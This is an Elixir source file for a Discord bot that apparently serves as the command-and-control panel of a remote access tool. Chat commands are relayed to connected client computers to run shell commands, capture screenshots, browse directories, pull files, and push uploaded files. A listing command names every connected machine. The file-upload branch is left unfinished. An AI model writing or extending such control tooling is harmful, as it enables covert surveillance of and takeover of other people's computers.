defmodule Discord.Bot do
  use Nostrum.Consumer
  require Logger

  alias Nostrum.Api

  @server_id Nostrum.Snowflake.cast!("966092445811109918")
  @category_id Nostrum.Snowflake.cast!("1212939909397217311")

  def handle_event({:MESSAGE_CREATE, msg, _ws_state}) do

    if msg.author.bot do
      Logger.debug("Discord: Ignoring bot message")
    else
      channel_id = msg.channel_id
      channel = Api.get_channel!(channel_id)
      if channel.parent_id == @category_id do
        handle_from_client_channel(msg, channel)
      else
        handle_other(msg)
      end
    end
  end

  def handle_from_client_channel(msg, channel) do
    header = String.split(msg.content, " ") |> Enum.at(0)
    id = channel.name
    { :ok, connection } = Connections.Registry.get(id)
    case header do
      "disconnect" ->
        Connections.Handler.disconnect(connection.handler)
        Api.create_message(msg.channel_id, "Disconnecting from #{id}")
      "shell" ->
        command = String.split(msg.content, " ") |> Enum.slice(1..-1) |> Enum.join(" ")
        Connections.Handler.send_shell_command(connection.handler, command)
      "screenshot" ->
        Connections.Handler.send_take_screenshot(connection.handler)
      "dir" ->
        path = String.split(msg.content, " ") |> Enum.at(1)
        Connections.Handler.send_get_directory(connection.handler, path)
      "get" ->
        path = String.split(msg.content, " ") |> Enum.at(1)
        Connections.Handler.send_get_file(connection.handler, path)
      "put" ->
        # Download file from discord cdn

        url = msg.attachments |> Enum.at(0) |> Map.get("url")

        {:ok, resp} = :httpc.request(:get, {url, []}, [], [body_format: :binary])
        {{_, 200, 'OK'}, _headers, body} = resp



    end
  end

  def handle_other(msg) do
    header = String.split(msg.content, " ") |> Enum.at(0)
    case header do
      "ping!" ->
        Api.create_message(msg.channel_id, "pong!")
      "!list" ->
        message =
          Enum.reduce(Connections.Registry.get_all, "", fn {_, connection}, acc ->
            acc <> "Client: #{connection.ident.id}\nComputer Name: #{connection.ident.computerName}\nConnected: #{connection.connected}\n\n"
          end)
        Api.create_message(msg.channel_id, message)
      "!connect" ->
        id = String.split(msg.content, " ") |> Enum.at(1)
        Connections.Registry.request_connection(id)
        Api.create_message(msg.channel_id, "Requested connection to #{id}")
      _ ->
        Logger.warning("Discord: Unhandled message: #{inspect(msg.content)}")
    end
  end

end
